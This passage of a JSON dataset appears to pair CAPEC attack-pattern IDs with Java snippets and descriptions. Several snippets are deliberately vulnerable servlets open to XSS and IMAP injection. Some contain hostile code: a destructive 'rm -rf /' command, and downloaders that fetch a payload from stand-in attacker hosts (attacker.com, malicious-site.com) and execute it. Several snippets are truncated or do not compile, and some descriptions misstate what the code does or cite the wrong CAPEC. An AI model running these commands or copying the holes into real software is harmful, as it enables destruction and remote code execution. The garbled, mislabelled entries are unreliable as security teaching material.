        "description": "This Java code snippet demonstrates the CAPEC pattern of attack where an adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. The code sets an untrusted search path for loading a library, allowing an attacker to redirect the application's attempts to access the library to a malicious library. This can lead to the execution of arbitrary code, especially dangerous if the targeted application has enhanced privileges."
    },
    {
        "capec_id": "160",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String script = req.getParameter(\"script\");\n        res.setContentType(\"text/html\");\n        PrintWriter out = res.getWriter();\n        out.println(\"<html><body><script>\" + script + \"</script></body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that takes a script as an input parameter and injects it into an HTML page without proper validation or neutralization, allowing an attacker to inject malicious scripts and potentially leading to cross-site scripting (XSS) attacks."
    },
    {
        "capec_id": "161",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://example.com\");\n        URLConnection conn = url.openConnection();\n        conn.setConnectTimeout(5000);\n        conn.setReadTimeout(5000);\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            System.out.println(inputLine);\n        }\n        in.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting characteristics of network infrastructure to perpetrate attacks or information gathering. The code establishes a communication channel with an endpoint without properly ensuring that it is communicating with the correct endpoint (CWE-923). It does not correctly specify the intended destination for the outgoing request (CWE-941). Additionally, it does not sufficiently ensure that the message was not modified during transmission (CWE-924). The code also exposes sensitive system-level information to an unauthorized control sphere (CWE-497). An attacker could exploit this vulnerability by manipulating the routing of network messages, redirecting the connection to a malicious server, and collecting sensitive information."
    },
    {
        "capec_id": "162",
        "code_snippet": "public class EShopliftingExample {\n    public static void processTransaction(HttpServletRequest request) {\n        String price = request.getParameter(\"price\");\n        String quantity = request.getParameter(\"quantity\");\n        String discount = request.getParameter(\"discount\");\n        \n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n        // CWE-472: External Control of Assumed-Immutable Web Parameter\n        // CWE-922: Insecure Storage of Sensitive Information\n        // CWE-639: Authorization Bypass Through User-Controlled Key\n        \n        double totalCost = Double.parseDouble(price) * Integer.parseInt(quantity) * (1 - Double.parseDouble(discount));\n        \n        // Process the transaction with the modified data\n        System.out.println(\"Transaction processed with total cost: \" + totalCost);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the EShoplifting attack, where an adversary modifies the price, quantity, or discount fields in an HTML form response to acquire items at a lower cost than intended. The server-side code trusts the client-side input and uses it to calculate the total cost of the transaction, without properly verifying the inputs."
    },
    {
        "capec_id": "163",
        "code_snippet": "import java.net.URL;\nimport javax.mail.Message;\nimport javax.mail.MessagingException;\nimport javax.mail.Session;\nimport javax.mail.Transport;\nimport javax.mail.internet.InternetAddress;\nimport javax.mail.internet.MimeMessage;\n\npublic class SpearPhishing {\n    public static void main(String[] args) throws MessagingException {\n        // CWE-451: Misrepresentation of Critical Information\n        String from = \\",
        "description": "This Java code snippet demonstrates a Spear Phishing attack, which is a targeted Phishing attack tailored to a specific user or group. The code sends a phishing email to the target, pretending to come from a trusted entity, with a link to a compromised site. The link is crafted to appear legitimate, using a reflected URL and a permissive cross-domain policy. The email also contains a link to an untrusted target with window.opener access, allowing the phishing site to modify security-critical properties of the window.opener object."
    },
    {
        "capec_id": "164",
        "code_snippet": "import java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.net.URLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class MobilePhishing {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"https://example.com/phishing-site\");\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    public static boolean authenticateUser(String username, String password) {\n        // CWE-309: Use of Password System for Primary Authentication\n        // CWE-308: Use of Single-factor Authentication\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public static void sendSMS(String phoneNumber, String message) {\n        // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        // CWE-290: Authentication Bypass by Spoofing\n        System.out.println(\"Sending SMS to \" + phoneNumber + \": \" + message);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a mobile phishing attack. The main method sends an HTTP request to a phishing website, which may spoof a legitimate website. The authenticateUser method uses a simple password-based authentication system, which is vulnerable to brute-force attacks (CWE-307) and does not implement dual-factor authentication (CWE-308). The sendSMS method simulates sending a phishing SMS message to a user, which may misrepresent critical information (CWE-451) and allow authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "165",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class FileManipulationVulnerability {\n    public static void processFile(String filename) throws IOException {\n        File file = new File(filename);\n        if (file.exists()) {\n            // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n            if (filename.endsWith(\".txt\")) {\n                // process as a text file\n            } else if (filename.endsWith(\".exe\")) {\n                // process as an executable file\n            }\n        }\n    }\n\n    public static void createTemporaryFile(String filename) throws IOException {\n        // CWE-377: Insecure Temporary File\n        File tempFile = new File(filename);\n        FileWriter writer = new FileWriter(tempFile);\n        writer.write(\"temporary file content\");\n        writer.close();\n    }\n\n    public static void traverseDirectory(String path) throws IOException {\n        // CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n        File dir = new File(path);\n        for (File file : dir.listFiles()) {\n            if (file.isDirectory()) {\n                traverseDirectory(file.getAbsolutePath());\n            } else {\n                processFile(file.getAbsolutePath());\n            }\n        }\n    }\n\n    public static void main(String[] args) throws IOException {\n        // CWE-73: External Control of File Name or Path\n        String userInput = \"../../../../../../../../etc/passwd\";\n        createTemporaryFile(userInput);\n        traverseDirectory(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a file manipulation vulnerability, where an attacker can modify file contents or attributes to cause incorrect processing by the application. The code allows user input to control file names and paths, which can lead to path traversal, insecure temporary file creation, and reliance on file name or extension for processing. This can result in arbitrary code execution, sensitive information exposure, or unstable application states."
    },
    {
        "capec_id": "166",
        "code_snippet": "public class PowerSaveRestore { \n    private boolean isLocked = false; \n    private boolean isAdmin = false; \n    private int securitySetting = 0; \n\n    public void saveState() { \n        // CWE-306: Missing Authentication for Critical Function \n        if (!isAdmin) { \n            System.out.println(\"Warning: Non-admin user attempting to save state.\"); \n        } \n\n        // CWE-1221: Incorrect Register Defaults or Module Parameters \n        securitySetting = 0x0000; \n\n        // CWE-1232: Improper Lock Behavior After Power State Transition \n        isLocked = false; \n    } \n\n    public void restoreState() { \n        // CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings \n        securitySetting = 0x0000; \n\n        // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation \n        if (!isLocked) { \n            System.out.println(\"Warning: Configuration state not locked during restore.\"); \n        } \n    } \n\n    public void resetState() { \n        // CWE-306: Missing Authentication for Critical Function \n        if (!isAdmin) { \n            System.out.println(\"Warning: Non-admin user attempting to reset state.\"); \n        } \n\n        // CWE-1221: Incorrect Register Defaults or Module Parameters \n        securitySetting = 0x0000; \n    } \n}",
        "description": "This Java code snippet demonstrates the CAPEC of forcing a target into a previous state to leverage potential weaknesses. It includes CWE-306 (Missing Authentication for Critical Function), CWE-1221 (Incorrect Register Defaults or Module Parameters), CWE-1232 (Improper Lock Behavior After Power State Transition), CWE-1271 (Uninitialized Value on Reset for Registers Holding Security Settings), and CWE-1304 (Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation). The code allows a non-admin user to reset the system configuration, and the security settings are not properly initialized or locked during power state transitions."
    },
    {
        "capec_id": "167",
        "code_snippet": "public class SoCAnalyzer {\n    public static void main(String[] args) {\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        String traceData = getTraceDataFromSoC();\n        System.out.println(traceData);\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(System.getProperty(\"os.name\"));\n        System.out.println(System.getProperty(\"os.version\"));\n\n        // CWE-506: Embedded Malicious Code\n        if (System.getProperty(\"os.name\").equals(\"Linux\")) {\n            Runtime.getRuntime().exec(\"rm -rf /\");\n        }\n\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        int secureVariable = 0;\n        if (secureVariable == 0) {\n            // security-critical code\n            System.out.println(\"Secure variable is 0\");\n        }\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        if (System.getProperty(\"debug\")) {\n            activateDebugLogic();\n        }\n    }\n\n    public static String getTraceDataFromSoC() {\n        // implementation to get trace data from SoC\n        return \"trace data\";\n    }\n\n    public static void activateDebugLogic() {\n        // implementation to activate debug logic\n        System.out.println(\"Debug logic activated\");\n    }\n}",
        "description": "This Java code snippet demonstrates white box analysis techniques to analyze the structure, function, and composition of a System-on-Chip (SoC) software. It includes vulnerabilities related to improper management of sensitive trace data, exposure of sensitive system information, embedded malicious code, processor optimization removal or modification of security-critical code, and hardware allowing activation of test or debug logic at runtime."
    },
    {
        "capec_id": "168",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.DosFileAttributes;\n\npublic class ADSExploit {\n    public static void main(String[] args) throws IOException {\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        String sensitiveData = \\",
        "description": "This Java code snippet demonstrates the exploitation of Microsoft NTFS Alternate Data Streams (ADS) to hide sensitive information and malicious files. It uses various CWEs to illustrate the vulnerabilities, including improper removal of sensitive information, improper handling of ADS, insecure operation on Windows junction/mount point, uncontrolled search path element, and path equivalence on Windows 8.3 filename."
    },
    {
        "capec_id": "169",
        "code_snippet": "public class InformationExposer {\n    private String sensitiveData = \"Top Secret Information\";\n    \n    public void processData(String input) {\n        if (input.length() > 10) {\n            System.out.println(\"Truncated input: \" + input.substring(0, 10)); // CWE-222\n        } else {\n            System.out.println(\"Full input: \" + input);\n        }\n        \n        if (input.equals(\"admin\")) {\n            System.out.println(\"Authorized access: \" + sensitiveData); // CWE-200\n        } else {\n            System.out.println(\"Unauthorized access attempt\");\n        }\n    }\n    \n    public void createResource() {\n        Runtime.getRuntime().exec(\"mkdir /tmp/attacker_resource\"); // CWE-1229\n    }\n    \n    public void behaveDifferently() {\n        if (System.getProperty(\"os.name\").equals(\"Linux\")) {\n            System.out.println(\"Linux-specific behavior\");\n        } else {\n            System.out.println(\"Windows-specific behavior\");\n        } // CWE-207, CWE-205\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of probing and exploration activities to identify constituents and properties of the target. It exposes sensitive information to unauthorized actors (CWE-200), truncates security-relevant information (CWE-222), behaves differently than equivalent products (CWE-207, CWE-205), and creates an emergent resource that can be used by attackers (CWE-1229)."
    },
    {
        "capec_id": "170",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FingerprintingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userAgent = req.getHeader(\"User-Agent\");\n        String version = req.getServerInfo();\n        String query = req.getQueryString();\n\n        if (query != null && query.contains(\"sensitiveInfo\")) {\n            resp.setStatus(400);\n            resp.getWriter().write(\"Error: \" + query);\n        } else {\n            resp.getWriter().write(\"<html><body>\" + userAgent + \" - \" + version + \"</body></html>\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows an attacker to perform web application fingerprinting. The servlet responds to GET requests and includes sensitive information such as the User-Agent header and server version in the response. Additionally, it includes a query string parameter 'sensitiveInfo' that, when present, causes the servlet to return an error message with the query string, potentially leaking sensitive information. This code embodies CWE-497, CWE-598, CWE-1125, CWE-209, and CWE-494."
    },
    {
        "capec_id": "171",
        "code_snippet": "public class DynamicEvaluation { \n public static void main(String[] args) { \n String userInput = \"x\"; \n String evalString = \"int \" + userInput + \" = 10;\"; \n try { \n Class<?> clazz = Class.forName(\" DynEval\"); \n clazz.getDeclaredMethod(\"eval\", String.class).invoke(clazz.newInstance(), evalString); \n } catch (Exception e) { \n System.out.println(\"Error: \" + e.getMessage()); \n } \n } \n} \n\nclass DynEval { \n public void eval(String evalString) { \n try { \n Runtime.getRuntime().exec(\"calc.exe\"); \n } catch (IOException e) { \n System.out.println(\"Error: \" + e.getMessage()); \n } \n } \n}",
        "description": "This Java code snippet demonstrates the CAPEC-77 attack pattern, which involves manipulating user-controlled variables. The code dynamically evaluates user input as part of a string, allowing an attacker to inject malicious code. The CWEs related to this CAPEC include CWE-914 (Improper Control of Dynamically-Identified Variables), CWE-913 (Improper Control of Dynamically-Managed Code Resources), CWE-627 (Dynamic Variable Evaluation), CWE-1126 (Declaration of Variable with Unnecessarily Wide Scope), and CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection'))."
    },
    {
        "capec_id": "173",
        "code_snippet": "import java.awt.Desktop;\nimport java.io.IOException;\nimport java.net.URI;\n\npublic class ClickjackingAttack {\n    public static void main(String[] args) {\n        String url = \"https://example.com/malicious-site\";\n        String buttonText = \"Submit Query\";\n        // Create a button that appears to submit a query but actually downloads software\n        javax.swing.JButton button = new javax.swing.JButton(buttonText);\n        button.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent e) {\n                try {\n                    // Open the malicious URL in the background\n                    Desktop.getDesktop().browse(new URI(url));\n                } catch (IOException ex) {\n                    // Handle exception\n                }\n            }\n        });\n    }\n}\n",
        "description": "This Java code snippet demonstrates a clickjacking attack, where a user is tricked into clicking a button that appears to submit a query but actually downloads software from a malicious site. The code uses a JButton with a misleading label and an ActionListener that opens the malicious URL in the background when the button is clicked. This attack exploits CWE-451 (User Interface Misrepresentation of Critical Information), CWE-290 (Authentication Bypass by Spoofing), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-925 (Improper Verification of Intent by Broadcast Receiver), and CWE-618 (Exposed Unsafe ActiveX Method)."
    },
    {
        "capec_id": "174",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.MultipartConfig;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Part;\n\n@WebServlet(name = \\",
        "description": "This Java code snippet demonstrates a vulnerable Flash file uploader that allows an attacker to inject malicious global parameters into a Flash file embedded within an HTML document. The code uses a servlet to handle file uploads and does not properly validate the uploaded file type, allowing an attacker to upload a malicious Flash file. The code also uses a permissive cross-domain policy, allowing the Flash file to access the embedding HTML document. The code does not neutralize special elements used in the template engine, allowing an attacker to inject malicious code. The code also uses improper delimiters in the command string, allowing an attacker to inject malicious arguments."
    },
    {
        "capec_id": "175",
        "code_snippet": "import java.io.File;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class CodeInclusionVulnerability {\n    public static void main(String[] args) throws Exception {\n        String userInput = \"http://example.com/malicious.jar\";\n        URL url = new URL(userInput);\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> clazz = loader.loadClass(\"MaliciousClass\");\n        clazz.getMethod(\"execute\").invoke(null);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a code inclusion vulnerability. It takes user input in the form of a URL, loads a JAR file from that URL, and executes a method from a class in the loaded JAR file. This allows an attacker to inject and execute arbitrary code, potentially leading to a remote code execution vulnerability."
    },
    {
        "capec_id": "176",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class ConfigurationManipulation {\n    public static void main(String[] args) {\n        String configFilePath = \"/path/to/config/file\";\n        String modifiedConfigContent = \"modified_config_value\";\n\n        try {\n            File configFile = new File(configFilePath);\n            FileWriter fileWriter = new FileWriter(configFile);\n            fileWriter.write(modifiedConfigContent);\n            fileWriter.close();\n            System.out.println(\"Configuration file modified successfully.\");\n        } catch (IOException e) {\n            System.out.println(\"Error modifying configuration file: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a configuration manipulation attack by modifying an external configuration file. The attacker can manipulate the file content to affect the behavior of the target application, which may lead to vulnerabilities such as CWE-15: External Control of System or Configuration Setting. The code writes a modified configuration value to a file, which can be exploited by an attacker to control the system or configuration settings."
    },
    {
        "capec_id": "177",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileLocationAttack {\n    public static void main(String[] args) {\n        String filename = \"config.properties\";\n        String path = System.getProperty(\"user.home\") + \"/\";\n        File file = new File(path + filename);\n        if (!file.exists()) {\n            try {\n                file.createNewFile();\n                System.out.println(\"Malicious file created: \" + file.getAbsolutePath());\n            } catch (IOException e) {\n                System.out.println(\"Error creating file: \" + e.getMessage());\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a file location attack, where an attacker creates a malicious file with the same name as a protected or privileged file. The code creates a file named 'config.properties' in the user's home directory, which could potentially be loaded by an application instead of the legitimate file, allowing the attacker to manipulate the system."
    },
    {
        "capec_id": "178",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FlashRedirectServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String url = req.getParameter(\"url\");\n        String flashVars = req.getParameter(\"flashVars\");\n        resp.sendRedirect(\"http://example.com/flash.swf?\" + flashVars + \"&url=\" + url);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable Flash redirect servlet that accepts user-controlled input for the URL and flashVars parameters. The servlet redirects the user to a Flash document (SWF file) with the provided parameters, allowing an attacker to exploit native Flash functionality in the client browser. This code is vulnerable to CWE-601 (URL Redirection to Untrusted Site), CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-79 (Cross-site Scripting), CWE-1022 (Use of Web Link to Untrusted Target with window.opener Access), and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)."
    },
    {
        "capec_id": "179",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class MicroServiceServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String sensitiveInfo = req.getParameter(\"sensitiveData\");\n        Cookie cookie = new Cookie(\"persistentCookie\", sensitiveInfo);\n        resp.addCookie(cookie);\n        resp.setContentType(\"text/html\");\n        resp.getWriter().write(\"<script>\\n\" +\n                \"    var xhr = new XMLHttpRequest();\\n\" +\n                \"    xhr.open('GET', '/micro-service?\" + sensitiveInfo + \"', true);\\n\" +\n                \"    xhr.send();\\n\" +\n                \"</script>\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable micro-service implementation that exposes sensitive information to an attacker. The doGet method handles GET requests and retrieves sensitive data from the query string. It then stores this data in a persistent cookie and writes it to the response. The response also includes a script that makes an XMLHttpRequest to the micro-service, passing the sensitive data as a query string. This code embodies CWE-598 by using the GET method with sensitive query strings, CWE-539 by using persistent cookies containing sensitive information, and CWE-602 by relying on client-side enforcement of server-side security. Additionally, it may be vulnerable to CWE-433 and CWE-219 if the micro-service is not properly configured to handle raw content or sensitive data under the web document root."
    },
    {
        "capec_id": "180",
        "code_snippet": "public class AccessControlSystem {\n    private static boolean isAdmin = false;\n    private static boolean isDebugEnabled = true;\n\n    public static void main(String[] args) {\n        if (isAdmin) {\n            // Critical resource\n            File file = new File(\"/etc/passwd\");\n            if (file.canRead()) {\n                System.out.println(\"File can be read\");\n            } else {\n                System.out.println(\"File cannot be read\");\n            }\n        } else {\n            // Incorrect permission assignment\n            if (isDebugEnabled) {\n                System.out.println(\"Debug mode is enabled\");\n                // DMA device enabled too early\n                enableDMA();\n                // On-chip debug and test interface with improper access control\n                testInterface();\n            } else {\n                System.out.println(\"Debug mode is disabled\");\n            }\n        }\n    }\n\n    private static void enableDMA() {\n        // Power-on of untrusted execution core before enabling fabric access control\n        System.out.println(\"DMA device enabled\");\n    }\n\n    private static void testInterface() {\n        // Insufficient granularity of access control\n        System.out.println(\"Test interface enabled\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable access control system. The isAdmin flag is used to control access to a critical resource (/etc/passwd file). However, the permission assignment is incorrect, allowing unauthorized access to the resource. Additionally, the code enables a DMA device too early, allows access to an on-chip debug and test interface without proper access control, and lacks granularity in access control. This code is vulnerable to various attacks, including unauthorized access and data extraction."
    },
    {
        "capec_id": "181",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.MultipartConfig;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Part;\n\n@WebServlet(name = \"vulnerableServlet\", urlPatterns = {\"/vulnerableServlet\"})\n@MultipartConfig(fileSizeThreshold = 1024 * 1024, maxFileSize = 1024 * 1024 * 5, maxRequestSize = 1024 * 1024 * 5 * 5)\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String filePath = \"\";\n        for (Part part : request.getParts()) {\n            filePath = getServletContext().getRealPath(\"/\" + getFileName(part));\n            part.write(filePath);\n        }\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<object id='flashObject' type='application/x-shockwave-flash' data='\" + filePath + \"'>\");\n        out.println(\"<param name='movie' value='\" + filePath + \"'>\");\n        out.println(\"<param name='allowScriptAccess' value='always'>\");\n        out.println(\"</object>\");\n        out.println(\"</body></html>\");\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a clickjacking vulnerability by allowing an attacker to upload a malicious Flash file, which can then be used to intercept user actions and perform unintended actions. The code uses a servlet to handle file uploads and generates an HTML page with an embedded Flash object. The Flash object is configured to allow script access, enabling the attacker to perform actions on behalf of the user. The code also lacks proper input validation and sanitization, making it vulnerable to cross-site scripting (CWE-79) and other attacks."
    },
    {
        "capec_id": "182",
        "code_snippet": "import java.applet.Applet;\nimport java.net.URL;\n\npublic class VulnerableFlashApplet extends Applet {\n    public void init() {\n        String flashUrl = getParameter(\"flashUrl\");\n        if (flashUrl != null) {\n            try {\n                URL url = new URL(flashUrl);\n                // No validation of the URL or its contents\n                // CWE-20: Improper Input Validation\n                // CWE-184: Incomplete List of Disallowed Inputs\n                AppletContext context = getAppletContext();\n                context.showDocument(url);\n            } catch (Exception e) {\n                // CWE-697: Incorrect Comparison\n                if (e.getMessage().equals(\"Error\")) {\n                    System.out.println(\"Error loading flash content\");\n                }\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable Flash applet that can be exploited by an attacker to execute malicious Flash content. The applet takes a 'flashUrl' parameter and loads the Flash content from the specified URL without validating the input or its contents, making it vulnerable to cross-site flashing attacks. The code also contains incorrect comparisons and incomplete lists of disallowed inputs, further increasing its vulnerability."
    },
    {
        "capec_id": "183",
        "code_snippet": "import java.io.IOException;\nimport javax.mail.MessagingException;\nimport javax.mail.Session;\nimport javax.mail.Store;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class MailServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String folder = req.getParameter(\"folder\");\n        String action = req.getParameter(\"action\");\n\n        try {\n            Session session = Session.getInstance(System.getProperties(), null);\n            Store store = session.getStore(\"imaps\");\n            store.connect(\"mail.example.com\", \"username\", \"password\");\n\n            if (action.equals(\"list\")) {\n                String command = \"LIST \" + folder;\n                store.executeCommand(command);\n            } else if (action.equals(\"delete\")) {\n                String command = \"UID STORE \" + folder + \" +FLAGS (\\Deleted)\";\n                store.executeCommand(command);\n            }\n        } catch (MessagingException e) {\n            resp.setStatus(500);\n            resp.setContentType(\"text/plain\");\n            resp.getWriter().write(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web-mail server that is susceptible to IMAP command injection attacks. The servlet takes 'folder' and 'action' parameters from the user and constructs IMAP commands using these inputs without proper sanitization. An attacker can inject malicious IMAP commands, such as 'LIST ..' or 'UID STORE * +FLAGS (\\Deleted)', to execute arbitrary commands on the back-end mail server. The code also includes CWE-209 by returning the error message with sensitive information, and CWE-602 by relying on the client to implement security mechanisms. CWE-116 is also applicable as the output is not properly encoded or escaped. CWE-535 is related as the error message can be used to gain unauthorized access to the system."
    },
    {
        "capec_id": "184",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/maliciousCode.jar\");\n            URLConnection conn = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // Execute the downloaded code without integrity check\n                Runtime.getRuntime().exec(inputLine);\n            }\n            in.close();\n        } catch (IOException e) {\n            System.out.println(\"Error downloading code: \" + e.getMessage());\n        }\n    }\n\n    // Embedded malicious code\n    public static void maliciousCode() {\n        try {\n            // Access sensitive system information\n            String osName = System.getProperty(\"os.name\");\n            String osArch = System.getProperty(\"os.arch\");\n            System.out.println(\"OS Name: \" + osName);\n            System.out.println(\"OS Architecture: \" + osArch);\n            // Inject errors to degrade hardware redundancy\n            // (Note: This is a hypothetical example and may not be applicable in real-world scenarios)\n            System.out.println(\"Injecting errors to degrade hardware redundancy...\");\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of undermining the integrity of software code by downloading and executing malicious code without integrity checks, embedding malicious code, exposing sensitive system information, and injecting errors to degrade hardware redundancy. The code downloads a JAR file from a remote location and executes it without verifying its origin and integrity, allowing an attacker to inject malicious code. The embedded malicious code accesses sensitive system information and injects errors to degrade hardware redundancy, further compromising the system's integrity."
    },
    {
        "capec_id": "185",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.InputStream;\n\npublic class MaliciousDownloader {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://attacker.com/malicious_code.exe\");\n        URLConnection conn = url.openConnection();\n        InputStream in = conn.getInputStream();\n        File file = new File(\"malicious_code.exe\");\n        FileOutputStream out = new FileOutputStream(file);\n        byte[] buffer = new byte[1024];\n        int numRead;\n        while ((numRead = in.read(buffer)) != -1) {\n            out.write(buffer, 0, numRead);\n        }\n        in.close();\n        out.close();\n        Runtime.getRuntime().exec(\"cmd /c start malicious_code.exe\");\n    }\n}\n",
        "description": "This Java code snippet downloads an executable file from a remote location without verifying its integrity or origin, and then executes it. This is a classic example of the CAPEC, where an attacker uses deceptive methods to cause a user or automated process to download and install dangerous code. The code embodies CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), CWE-507 (Trojan Horse), and CWE-509 (Replicating Malicious Code). Additionally, it may also expose sensitive system information to an unauthorized control sphere (CWE-497)."
    },
    {
        "capec_id": "186",
        "code_snippet": "public class FakeUpdater {\n    public static void main(String[] args) {\n        String url = \"http://malicious-site.com/malicious_update.jar\";\n        try {\n            URL downloadUrl = new URL(url);\n            HttpURLConnection connection = (HttpURLConnection) downloadUrl.openConnection();\n            connection.connect();\n            int fileSize = connection.getContentLength();\n            byte[] buffer = new byte[fileSize];\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"update.jar\");\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n            inputStream.close();\n            outputStream.close();\n            // Load the downloaded JAR file and execute its main class\n            URLClassLoader classLoader = new URLClassLoader(new URL[] { new URL(\"jar:file:update.jar!/\") });\n            Class<?> clazz = classLoader.loadClass(\"com.malicious.Main\");\n            Method mainMethod = clazz.getMethod(\"main\", String[].class);\n            mainMethod.invoke(null, (Object) new String[] {\"arg1\", \"arg2\"});\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
